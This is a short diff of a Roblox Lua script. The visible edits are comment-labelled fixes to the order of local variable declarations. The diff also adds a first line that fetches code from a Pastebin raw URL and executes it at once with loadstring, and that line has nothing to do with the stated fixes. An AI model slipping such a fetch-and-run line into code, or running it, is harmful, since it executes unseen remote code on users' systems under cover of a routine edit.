@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/Bqbsph7s"))()
 -- locals
 local players = game:GetService("Players") -- Corrected the order of declaration
 local player = players.LocalPlayer -- Moved this line after players is defined
